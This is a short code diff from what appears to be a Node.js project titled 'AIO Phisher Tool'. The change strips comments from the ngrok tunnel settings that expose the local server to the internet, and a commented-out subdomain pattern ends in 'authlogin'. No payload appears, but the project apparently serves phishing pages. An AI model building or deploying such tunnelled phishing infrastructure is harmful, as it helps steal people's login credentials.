@@ -51,16 +51,12 @@ app.get("/info", async (req, res) => {
 })
 app.listen(config.server.port, async () => {
     const url = await ngrok.connect({
-        proto: 'http', // http|tcp|tls, defaults to http
-        addr: config.server.port, // port or network address, defaults to 80
-        // auth: 'user:pwd', // http basic authentication for tunnel
-        // subdomain: `${chooses[answer].name}authlogin`, // reserved tunnel name https://alex.ngrok.io
-        authtoken: config.ngrokAuth, // your authtoken from ngrok.com
-        region: 'us', // one of ngrok regions (us, eu, au, ap, sa, jp, in), defaults to us
-        // configPath: '~/git/project/ngrok.yml', // custom path for ngrok config file
-        // binPath: path => path.replace('app.asar', 'app.asar.unpacked'), // custom binary path, eg for prod in electron
-        // onStatusChange: status => { }, // 'closed' - connection is lost, 'connected' - reconnected
-        // onLogEvent: data => { }, // returns stdout messages from ngrok process
+        proto: 'http',
+        addr: config.server.port,
+        // auth: 'user:pwd',
+        // subdomain: `${chooses[answer].name}authlogin`,
+        authtoken: config.ngrokAuth,
+        region: 'us', //(us, eu, au, ap, sa, jp, in), defaults to us
     }).catch(e=>{return console.log(colors.bgRed(`[ERR]`) + colors.red(` Can't start ngrok session!`))})
     console.log(colors.bgGreen(`[OK]`) + colors.green(` Server is working at port ${config.server.port}`))
     let table = new ascii(`AIO Phisher Tool`);
